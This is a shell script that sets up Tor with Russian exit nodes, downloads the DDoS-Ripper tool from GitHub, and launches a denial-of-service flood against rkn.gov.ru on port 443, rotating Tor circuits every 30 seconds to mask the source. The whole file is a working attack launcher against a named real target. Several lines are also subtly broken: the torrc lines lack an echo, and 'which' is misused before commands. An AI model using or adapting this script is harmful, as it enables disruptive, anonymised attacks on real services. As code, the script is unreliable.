#!/bin/sh 
 
TARGET="rkn.gov.ru" 
PORT="443" 
TURBO=135 
QUIET="10000" 
 
# --- Installing Common --- 
apt update 
apt install -y htop wget vim apache2-utils git 
 
# ---  Installing TOR   --- 
apt update 
apt install -y tor tor-geoipdb proxychains torsocks geoip-bin 
"ExitNodes {ru}">> /etc/tor/torrc 
"StrictNodes 1" >> /etc/tor/torrc 
service tor start 
 
# Install DDoS-Ripper 
git clone https://github.com/palahsu/DDoS-Ripper.git 
 
if [ -d "/DDoS-Ripper" ]; 
then 
  cd /DDoS-Ripper 
else 
  exit 
fi 
 
which screen -dm bash -c 'bash --init-file <(while true; do sudo service tor restart; sleep 30; done)' 
 
for target in $TARGET; 
do 
  which screen -d -m -S $target which torsocks -P 9050 which python3 DRipper.py -s $TARGET -p $PORT -t $TURBO -q $QUIET 
done
